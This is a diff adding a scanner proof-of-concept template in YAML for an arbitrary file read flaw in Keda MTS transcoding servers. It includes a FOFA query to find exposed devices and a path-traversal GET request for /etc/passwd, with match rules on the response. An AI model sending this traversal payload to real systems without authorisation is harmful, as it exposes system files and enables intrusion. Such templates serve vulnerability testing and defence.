@@ -1,0 +1,15 @@
+id: poc-yaml-keda-mts-transcoding-server-anyfile-read
+info:
+  name: 科达 MTS转码服务器 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MTS转码服务器
+  fofa: app="MTS转码服务器"
+requests:
+- method: GET
+  path: /../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
